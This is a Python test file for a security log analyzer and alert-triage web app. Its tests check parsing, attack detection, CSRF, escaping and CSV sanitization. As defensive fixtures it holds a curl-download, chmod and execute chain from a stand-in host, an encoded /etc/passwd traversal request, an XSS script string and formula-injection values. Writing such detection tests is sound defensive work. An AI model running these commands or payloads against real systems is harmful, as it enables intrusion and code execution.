from io import BytesIO
from datetime import datetime, timedelta, timezone
from concurrent.futures import ThreadPoolExecutor
import config
from app import app, analyze_log, get_results, csv_cell
from analyzer import storage
from analyzer.parser import parse_log_file, parse_line
from analyzer.detector import detect
def event(line, timestamp="2026-09-01T10:00:00+00:00", user="alice", ip="192.0.2.1", status="success", action="login"):
    return dict(line=line, timestamp=timestamp, user=user, ip=ip, status=status, action=action, country="UNKNOWN", raw="")

def test_invalid_timestamp_and_ip_are_warnings(tmp_path):
    path = tmp_path / "bad.log"
    path.write_text('not-a-time user=a ip=192.0.2.1 country=US action=login status=failed\n'
                    '2026-09-01T10:00:00Z user=a ip=999.2.3.4 country=US action=login status=failed\n'
                    '2026-09-01T10:00:00Z user=a ip=192.0.2.1 country=US action=login status=success\n')
    events, errors = parse_log_file(path)
    assert len(events) == 1 and len(errors) == 2

def test_timestamp_offsets_normalize_to_utc():
    value = parse_line('2026-09-01T12:00:00+02:00 user=a ip=192.0.2.1 country=US action=login status=success', 1)
    assert value['timestamp'] == '2026-09-01T10:00:00+00:00'

def test_web_failures_are_not_brute_force():
    events = [event(i, status='failed', action='GET') for i in range(1, 8)]
    assert not any(f['type'].startswith('brute_force') for f in detect(events))

def test_midnight_baseline_is_circular():
    events = [event(i, timestamp=f'2026-09-01T{hour}:00+00:00') for i,hour in enumerate(['23:30','23:40','00:10','00:20'],1)]
    assert not any(f['type'] == 'unusual_time' for f in detect(events))

def test_encoded_web_attack_detected():
    value = {**event(1, action='GET'), 'request': 'GET /%2e%2e%2fetc/passwd HTTP/1.1'}
    assert any(f['type'] == 'web_attack' for f in detect([value]))

def test_duplicate_beacons_are_not_periodic():
    values = [{**event(i, action='c2', status='alert'), 'event_type':'beacon', 'destination_port':443} for i in range(1,4)]
    assert not any(f['type']=='c2_beaconing' for f in detect(values))

def test_csrf_enforced_and_valid_form_works(monkeypatch):
    monkeypatch.setitem(app.config, 'TESTING', False)
    client = app.test_client()
    assert client.post('/load-sample').status_code == 400
    assert client.post('/load-sample', data={'csrf_token':''}).status_code == 400
    client.get('/')
    with client.session_transaction() as session:
        token = session['csrf_token']
    assert client.post('/load-sample', data={'csrf_token':token}).status_code == 302
    alert = get_results()['alerts'][0]
    assert client.post(f"/api/alert/{alert['id']}/status", json={'status':'resolved'}, headers={'X-CSRF-Token':token}).status_code == 200

def test_malformed_status_payloads():
    client = app.test_client()
    for payload in [[1], {'status':1}, {}, None]:
        assert client.post('/api/alert/none/status', json=payload).status_code == 400

def test_triage_counts_and_audit():
    result = analyze_log(config.BASE_DIR / 'tests/fixtures/sample_incident.log')
    assert storage.update_status(result['alerts'][0]['id'], 'resolved', 'tester')
    assert get_results()['summary']['open_alerts'] == len(result['alerts'])-1
    with storage.connection() as db:
        assert db.execute('SELECT actor, new_status FROM audit').fetchone() == ('tester', 'resolved')

def test_concurrent_triage_does_not_lose_updates():
    result = analyze_log(config.BASE_DIR / 'tests/fixtures/sample_incident.log')
    ids = [a['id'] for a in result['alerts'][:6]]
    with ThreadPoolExecutor(max_workers=4) as pool:
        assert all(pool.map(lambda aid: storage.update_status(aid, 'resolved', 'tester'), ids))
    assert get_results()['summary']['open_alerts'] == len(result['alerts'])-len(ids)

def test_upload_single_parse_cleanup_and_original_name(monkeypatch):
    client = app.test_client()
    response = client.post('/upload', data={'log_file':(BytesIO(b'2026-09-01T10:00:00Z user=a ip=192.0.2.1 country=US action=login status=success'), 'source.log')})
    assert response.status_code == 302
    assert get_results()['source'] == 'source.log'
    assert list(config.UPLOAD_DIR.iterdir()) == []

def test_stale_alert_id_does_not_modify_new_analysis():
    old = analyze_log(config.BASE_DIR/'tests/fixtures/sample_incident.log')['alerts'][0]['id']
    analyze_log(config.BASE_DIR/'tests/fixtures/sample_incident.log')
    assert not storage.update_status(old, 'resolved', 'tester')

def test_limits_and_invalid_encoding(monkeypatch):
    client = app.test_client()
    assert client.post('/upload',data={'log_file':(BytesIO(b'\xff'), 'a.log')}).status_code == 302
    monkeypatch.setitem(app.config, 'MAX_CONTENT_LENGTH', 20)
    assert client.post('/upload',data={'log_file':(BytesIO(b'a'*100), 'a.log')}).status_code == 413

def test_csv_formula_sanitization():
    for value in ['=1+1',' +1','@SUM(A1)','\t=1+1']:
        assert csv_cell(value).startswith("'")
    assert csv_cell('normal') == 'normal'

def test_report_filters_and_headers():
    analyze_log(config.BASE_DIR/'tests/fixtures/sample_incident.log')
    response = app.test_client().get('/report?q=impossible-search')
    assert response.status_code == 200 and b'No findings match' in response.data
    assert response.headers['X-Content-Type-Options'] == 'nosniff'

def test_bounded_history(monkeypatch):
    monkeypatch.setattr(config, 'HISTORY_LIMIT', 2)
    for _ in range(3):
        analyze_log(config.BASE_DIR/'tests/fixtures/sample_incident.log')
    with storage.connection() as db:
        assert db.execute('SELECT COUNT(*) FROM runs').fetchone()[0] == 2

def test_repeated_suspicious_logins_do_not_duplicate_command_chain():
    logins = [event(i, ip="192.0.2.77") for i in range(1,20)]
    commands = [dict(event(20+i, timestamp=f"2026-09-01T10:01:0{i}+00:00", ip="192.0.2.77", action="privilege", status="alert"), command=cmd) for i,cmd in enumerate(["curl http://example.test/p -o /tmp/p", "chmod +x /tmp/p", "/tmp/p"])]
    findings = detect(logins+commands)
    assert sum(f['type']=='post_auth_download_execute' for f in findings)==1

def test_unclassified_alert_is_not_assumed_c2():
    assert not detect([event(1,action='security_event',status='alert')])

def test_raw_evidence_escaped():
    result = analyze_log(config.BASE_DIR/'tests/fixtures/sample_incident.log')
    line=result['alerts'][0]['line']
    next(e for e in result['events'] if e['line']==line)['raw']='<script>alert(1)</script>'
    # A separate ID is required because persisted runs are immutable except for triage.
    result['analysis_id']='escape-check'
    result['generated_at']='2099-01-01T00:00:00+00:00'
    storage.save(result)
    response = app.test_client().get('/report')
    assert b'<script>alert(1)</script>' not in response.data
    assert b'&lt;script&gt;alert(1)&lt;/script&gt;' in response.data

def test_report_pagination():
    result = analyze_log(config.BASE_DIR/'tests/fixtures/sample_incident.log')
    result['alerts']=[dict(result['alerts'][0],id=f'alert-{i}') for i in range(205)]
    result['analysis_id']='pagination-check'
    result['generated_at']='2099-01-01T00:00:00+00:00'
    storage.save(result)
    client=app.test_client()
    assert client.get('/report').data.count(b'class="finding-card alert-row-item"')==100
    assert client.get('/report?page=3').data.count(b'class="finding-card alert-row-item"')==5

def test_concurrent_sessions_are_not_guessed(tmp_path):
    path=tmp_path/'sessions.log'
    path.write_text('2026-09-01 10:00:00 h sshd[1]: Accepted password for a from 192.0.2.1 port 22\n'
                    '2026-09-01 10:00:01 h sshd[1]: pam_unix(sshd:session): session opened for user a\n'
                    '2026-09-01 10:00:02 h sshd[2]: Accepted password for a from 192.0.2.2 port 22\n'
                    '2026-09-01 10:00:03 h sshd[2]: pam_unix(sshd:session): session opened for user a\n'
                    '2026-09-01 10:00:04 h sudo: a : TTY=pts/0 ; PWD=/home/a ; USER=root ; COMMAND=/usr/bin/id\n')
    events, errors=parse_log_file(path)
    assert not errors and events[-1]['ip']=='UNKNOWN'
